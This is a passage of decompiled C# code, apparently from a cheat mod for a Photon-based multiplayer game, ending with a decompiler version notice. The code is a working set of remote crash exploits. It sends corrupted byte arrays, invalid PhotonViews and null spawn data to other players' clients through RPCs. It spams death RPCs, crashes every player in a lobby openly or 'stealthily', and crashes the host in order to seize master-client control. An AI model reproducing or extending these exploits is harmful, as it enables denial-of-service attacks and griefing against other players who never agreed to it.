				return;
			}
			try
			{
				PhotonView val = PhotonView.Find(-1);
				if (target.refs != null && target.refs.carriying != null && (Object)(object)target.photonView != (Object)null)
				{
					target.photonView.RPC("RPCA_StartCarry", target.photonView.Owner, new object[1] { val });
					Player owner = target.photonView.Owner;
					Debug.Log((object)("[Crash] Sent invalid PhotonView to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Invalid PhotonView crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Statuses(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[10000];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(i % 256);
				}
				target.photonView.RPC("SyncStatusesRPC", target.photonView.Owner, new object[1] { array });
				Debug.Log((object)("[Crash] Sent corrupted status data  DESERIALIZATION CRASH (target: " + target.photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Status crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Afflictions(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[20000];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = 170;
				}
				target.photonView.RPC("SyncAfflictionsRPC", target.photonView.Owner, new object[1] { array });
				Debug.Log((object)("[Crash] Sent corrupted affliction data  DESERIALIZATION CRASH (target: " + target.photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Affliction crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Thorns(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[5000];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = 127;
				}
				target.photonView.RPC("SyncThornsRPC_Remote", target.photonView.Owner, new object[1] { array });
				Debug.Log((object)("[Crash] Sent corrupted thorn data  DESERIALIZATION CRASH (target: " + target.photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Thorn crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_ReconnectData(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				CharacterSpawner val = Object.FindFirstObjectByType<CharacterSpawner>();
				if (val != null && (Object)(object)val.photonView != (Object)null)
				{
					object obj = Activator.CreateInstance(typeof(ReconnectData));
					val.photonView.RPC("SpawnPlayerRPC", target.photonView.Owner, new object[2] { false, obj });
					Debug.Log((object)("[Crash] Sent invalid ReconnectData  SPAWN CRASH (target: " + target.photonView.Owner.NickName + ")"));
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] ReconnectData crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_AllMethods(Character target, bool includeSelf = false)
		{
			if (!(target == null) && !((Object)(object)target.photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				Player owner = target.photonView.Owner;
				Debug.LogWarning((object)("[Crash] ULTIMATE CRASH - All immediate methods to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				CrashPlayer_DirectPlayerRPCs(target);
				CrashPlayer_AllNullRefs(target);
				CrashPlayer_InvalidPhotonView(target);
				CrashPlayer_NullReferences(target);
				CrashPlayer_MaxArraySize(target);
				CrashPlayer_Inventory(target);
				CrashPlayer_StatusArrayBounds(target);
				CrashPlayer_Deserialization(target);
				CrashPlayer_Statuses(target);
				CrashPlayer_Afflictions(target);
				CrashPlayer_Thorns(target);
				CrashPlayer_ReconnectData(target);
				CrashPlayer_DivisionByZero(target);
				CrashPlayer_ExtremeValues(target);
			}
		}

		public static void CrashPlayer_Ultimate(Character target, bool includeSelf = false)
		{
			if (!(target == null) && !((Object)(object)target.photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				Player owner = target.photonView.Owner;
				Debug.LogWarning((object)("[Crash] ULTIMATE CRASH initiated to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				CrashPlayer_AllMethods(target);
			}
		}

		public static void CrashPlayer_ObjectSpam(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				for (int i = 0; i < 100; i++)
				{
					try
					{
						target.photonView.RPC("RPCA_Die", target.photonView.Owner, new object[1] { target.Center });
					}
					catch
					{
					}
				}
				Debug.Log((object)("[Crash] Sent RPCA_Die spam  MEMORY EXHAUSTION (target: " + target.photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Object spam failed: " + ex.Message));
			}
		}

		public static void CrashAllPlayersAndDisconnect()
		{
			try
			{
				Debug.Log((object)"[Crash] Starting crash all players in lobby...");
				List<Character> list = new List<Character>();
				try
				{
					MethodInfo method = typeof(PlayerHandler).GetMethod("GetAllPlayerCharacters", BindingFlags.Static | BindingFlags.Public);
					if (method != null && method.Invoke(null, null) is IEnumerable enumerable)
					{
						foreach (Character item in enumerable)
						{
							Character val = item;
							if (val != null && (Object)(object)val.photonView != (Object)null)
							{
								list.Add(val);
							}
						}
					}
				}
				catch
				{
					Character[] array = Object.FindObjectsByType<Character>(FindObjectsSortMode.None);
					foreach (Character val2 in array)
					{
						if (val2 != null && (Object)(object)val2.photonView != (Object)null)
						{
							list.Add(val2);
						}
					}
				}
				Debug.Log((object)$"[Crash] Found {list.Count} players to crash");
				foreach (Character item2 in list)
				{
					if (item2 != null && (Object)(object)item2.photonView != (Object)null && !item2.photonView.IsMine)
					{
						Player owner = item2.photonView.Owner;
						Debug.Log((object)("[Crash] Crashing " + (((owner != null) ? owner.NickName : null) ?? "Unknown") + "..."));
						CrashPlayer_AllMethods(item2);
					}
				}
				Debug.Log((object)"[Crash] Crash all players complete!");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Crash] Error in CrashAllPlayersAndDisconnect: " + ex.Message + "\n" + ex.StackTrace));
			}
		}

		public static void CrashAllPlayersStealth()
		{
			try
			{
				Debug.Log((object)"[Stealth Crash] Starting stealth crash on all players...");
				List<Character> list = new List<Character>();
				try
				{
					MethodInfo method = typeof(PlayerHandler).GetMethod("GetAllPlayerCharacters", BindingFlags.Static | BindingFlags.Public);
					if (method != null && method.Invoke(null, null) is IEnumerable enumerable)
					{
						foreach (Character item in enumerable)
						{
							Character val = item;
							if (val != null && (Object)(object)val.photonView != (Object)null)
							{
								list.Add(val);
							}
						}
					}
				}
				catch
				{
					Character[] array = Object.FindObjectsByType<Character>(FindObjectsSortMode.None);
					foreach (Character val2 in array)
					{
						if (val2 != null && (Object)(object)val2.photonView != (Object)null)
						{
							list.Add(val2);
						}
					}
				}
				foreach (Character item2 in list)
				{
					if (item2 != null && (Object)(object)item2.photonView != (Object)null && !item2.photonView.IsMine)
					{
						CrashPlayer_TriggerRelayBounds(item2);
						CrashPlayer_TornadoNullRefs(item2);
						CrashPlayer_RescueHookNull(item2);
					}
				}
				Debug.Log((object)"[Stealth Crash] Stealth crash initiated on all players!");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Stealth Crash] Error: " + ex.Message + "\n" + ex.StackTrace));
			}
		}

		public static void KickPlayer(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || (target.photonView.IsMine && !includeSelf))
			{
				return;
			}
			try
			{
				Player owner = target.photonView.Owner;
				if (owner == null)
				{
					return;
				}
				Debug.Log((object)("[Kick] Attempting to kick " + owner.NickName + " from lobby..."));
				if (PhotonNetwork.IsMasterClient)
				{
					try
					{
						PhotonNetwork.CloseConnection(owner);
						Debug.Log((object)("[Kick] ? Closed connection to " + owner.NickName + " (Master Client)"));
						return;
					}
					catch (Exception ex)
					{
						Debug.LogWarning((object)("[Kick] CloseConnection failed: " + ex.Message));
					}
				}
				Debug.Log((object)("[Kick] Not master client - attempting to crash " + owner.NickName + " first..."));
				CrashPlayer_AllMethods(target);
			}
			catch (Exception ex2)
			{
				Debug.LogWarning((object)("[Kick] Kick failed: " + ex2.Message));
			}
		}

		public static void ForceHost()
		{
			try
			{
				if (!PhotonNetwork.InRoom)
				{
					Debug.LogWarning((object)"[Force Host] Not in a Photon room!");
					return;
				}
				if (PhotonNetwork.IsMasterClient)
				{
					Debug.Log((object)"[Force Host] Already master client!");
					return;
				}
				Player masterClient = PhotonNetwork.MasterClient;
				if (masterClient == null)
				{
					Debug.LogWarning((object)"[Force Host] No master client found!");
					return;
				}
				Debug.Log((object)("[Force Host] Current master client: " + masterClient.NickName));
				Character val = null;
				foreach (Character allCharacter in Character.AllCharacters)
				{
					if (allCharacter != null && (Object)(object)allCharacter.photonView != (Object)null && allCharacter.photonView.Owner != null && allCharacter.photonView.Owner.ActorNumber == masterClient.ActorNumber)
					{
						val = allCharacter;
						break;
					}
				}
				if (val != null)
				{
					Debug.Log((object)"[Force Host] Found master client character - attempting to crash them...");
					CrashPlayer_AllMethods(val);
				}
				else
				{
					Debug.LogWarning((object)"[Force Host] Could not find master client character");
				}
				Debug.Log((object)"[Force Host] Force host attempt initiated!");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Force Host] Error: " + ex.Message + "\n" + ex.StackTrace));
			}
		}
	}
}
You are not using the latest version of the tool, please update.
Latest version is '10.1.0.8386' (yours is '8.2.0.7535-95108c96')
